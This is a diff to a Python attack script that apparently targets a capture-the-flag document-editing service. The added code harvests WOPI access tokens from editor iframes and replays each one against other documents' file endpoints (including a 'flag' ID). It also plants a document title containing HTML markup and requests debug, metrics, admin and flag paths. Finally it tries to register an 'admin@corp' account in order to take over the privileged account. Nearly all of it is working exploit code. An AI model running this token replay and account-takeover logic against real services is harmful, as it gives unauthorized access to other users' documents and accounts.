@@ -129,35 +129,59 @@ if p.forms:
         text, final = request(form["action"] or "/login", fields)
         parse(text)
 
-home, final = request("/", max_body=150000)
-hp = parse(home)
-shared, _ = request("/shared", max_body=100000)
-parse(shared)
-
-# Follow all non-destructive links exposed by the document list (including share).
-seen = set()
-for link in hp.links:
-    if link in seen or link in ("/", "/shared") or "delete" in link or "logout" in link:
-        continue
-    if link.startswith("/"):
-        seen.add(link)
-        body, _ = request(link, max_body=100000)
-        parse(body)
-
-# Probe WOPI object authorization with predictable neighbouring document IDs.
-for docid in ("d0", "d1", "d2"):
-    editor, _ = request("/edit/" + docid, max_body=80000)
-    parse(editor)
+def editor_token(docid):
+    editor, _ = request("/edit/" + docid, max_body=70000)
     match = re.search(r'<iframe[^>]+src=["\']([^"\']+)', editor, re.I)
     if not match:
-        continue
+        return ""
     iframe = html.unescape(match.group(1))
     query = urllib.parse.parse_qs(urllib.parse.urlsplit(iframe).query)
     token = query.get("access_token", [""])[0]
-    print("WOPI", docid, "IFRAME", iframe, "TOKEN_LENGTH", len(token), flush=True)
-    if docid == "d1":
-        cool, _ = request(iframe, max_body=60000)
-        parse(cool)
-    for suffix in ("", "/contents"):
-        path = "/wopi/files/" + docid + suffix + "?access_token=" + urllib.parse.quote(token)
-        request(path, max_body=100000)
+    print("TOKEN_FOR", docid, token, flush=True)
+    return token
+
+
+home, _ = request("/", max_body=90000)
+parse(home)
+created, final = request("/docs/create", {"folder": "", "title": "second-<b>probe</b>"}, max_body=70000)
+print("SECOND_DOC", final, flush=True)
+tokens = {"d1": editor_token("d1"), "d2": editor_token("d2")}
+for token_owner, token in tokens.items():
+    if not token:
+        continue
+    for docid in ("d0", "d1", "d2", "d3", "flag"):
+        path = "/wopi/files/" + docid + "?access_token=" + urllib.parse.quote(token)
+        print("CROSS_TOKEN", token_owner, "->", docid, flush=True)
+        request(path, max_body=15000)
+
+for path in (
+    "/hosting/discovery", "/hosting/capabilities", "/cool/convert-to",
+    "/metrics", "/debug/pprof/", "/debug/pprof/cmdline", "/admin",
+    "/flag", "/flag.txt", "/internal/flag", "/health", "/api",
+):
+    request(path, max_body=50000)
+
+# Determine whether the obvious privileged account already exists. A 409 means
+# it does; successful registration would instead give us that account directly.
+jar.clear()
+EMAIL = "admin@corp"
+PASSWORD = "Arena-Admin-93aa1301!"
+NAME = "admin"
+submit_form("/register")
+login_text, _ = request("/login", max_body=30000)
+p = parse(login_text)
+if p.forms:
+    form = p.forms[0]
+    fields = {}
+    for i in form["inputs"]:
+        n = i.get("name")
+        if not n:
+            continue
+        if i.get("type") == "hidden":
+            fields[n] = i.get("value", "")
+        elif n == "email":
+            fields[n] = EMAIL
+        elif n == "password":
+            fields[n] = PASSWORD
+    request(form["action"] or "/login", fields, max_body=50000)
+request("/", max_body=50000)
